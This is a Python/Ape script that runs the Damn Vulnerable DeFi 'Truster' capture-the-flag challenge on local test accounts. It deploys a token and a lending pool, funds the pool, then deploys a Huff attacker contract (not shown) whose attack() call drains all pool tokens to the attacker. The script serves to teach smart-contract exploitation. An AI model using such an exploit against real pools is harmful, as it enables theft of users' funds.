from ape import accounts, project
from eth_abi import encode
from ..utils.helper import w3, get_sig, send_tx, deploy_huff_contract

TOKENS_IN_POOL = w3.to_wei(1000000, "ether")


def main():
    # --- BEFORE EXPLOIT --- #
    print("\n--- Setting up scenario ---\n")

    # get accounts
    deployer = accounts.test_accounts[0]
    attacker = accounts.test_accounts[1]

    print(
        f"\n--- \nOur players:\n⇒ Deployer: {deployer}\n⇒ Attacker: {attacker}\n---\n"
    )

    # deploy token and lender contracts
    print("\n--- Deploying Token and Lender Contracts ---\n")
    token = project.DamnValuableToken.deploy(sender=deployer)
    pool = project.TrusterLenderPool.deploy(token, sender=deployer)
    assert pool.token() == token

    # transfer tokens to pool
    print("\n--- Funding Pool with tokens ---\n")
    token.transfer(pool, TOKENS_IN_POOL, sender=deployer)

    assert token.balanceOf(pool) == TOKENS_IN_POOL
    assert token.balanceOf(attacker) == 0

    # define intial balances for pool and attacker
    pool_initial_bal = token.balanceOf(pool) / 10**18
    attacker_initial_bal = token.balanceOf(attacker) / 10**18

    print(
        f"\n--- \nInitial Balances:\n⇒ Pool: {pool_initial_bal}\n⇒ Attacker: {attacker_initial_bal}\n---\n"
    )

    # --- EXPLOIT GOES HERE --- #
    print("\n--- Initiating exploit... ---\n")

    # exploit
    attacker_contract = deploy_huff_contract(
        "TrusterAttacker.huff",
        encode(["address", "address"], [pool.address, token.address]),
        attacker,
    )
    send_tx(attacker, attacker_contract, get_sig("attack()"))

    # --- AFTER EXPLOIT --- #
    print(
        "\n--- After exploit: attacker should have stolen all tokens from the pool ---\n"
    )

    # define ending balances for pool and attacker
    pool_ending_bal = token.balanceOf(pool) / 10**18
    attacker_ending_bal = token.balanceOf(attacker) / 10**18

    print(
        f"\n--- \nEnding Balances:\n⇒ Pool: {pool_ending_bal}\n⇒ Attacker: {attacker_ending_bal}\n---\n"
    )

    assert token.balanceOf(attacker) == TOKENS_IN_POOL
    assert token.balanceOf(pool) == 0

    print("\n--- 🥂 Challenge Completed! 🥂---\n")


if __name__ == "__main__":
    main()
